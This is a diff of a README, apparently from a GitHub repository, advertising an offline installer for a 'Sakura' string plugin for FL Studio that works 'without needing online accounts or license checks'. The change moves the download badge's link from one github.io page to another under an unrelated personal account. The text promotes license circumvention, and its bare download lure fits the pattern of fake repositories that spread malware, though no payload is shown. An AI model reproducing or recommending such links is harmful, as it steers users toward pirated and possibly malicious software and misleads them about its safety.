@@ -3,7 +3,7 @@
 Bring delicate, organic string sounds to your **FL Studio** projects with **Sakura Plugin** — installed fully. This guide helps you deploy Sakura to expand your synth library without needing online accounts or license checks.
 
 ⬇️ **Download**  
-[![Download Sakura Offline Setup](https://img.shields.io/badge/Download-Sakura_Offline_Setup-darkgreen?style=for-the-badge&logo=image-line&logoColor=white)](https://sakura-plugin-for-fl-studio.github.io/.github/)
+[![Download Sakura Offline Setup](https://img.shields.io/badge/Download-Sakura_Offline_Setup-darkgreen?style=for-the-badge&logo=image-line&logoColor=white)](https://lauriedoylelau.github.io/.github/sakura-plugin-for-fl-studio)
 
 ---
 
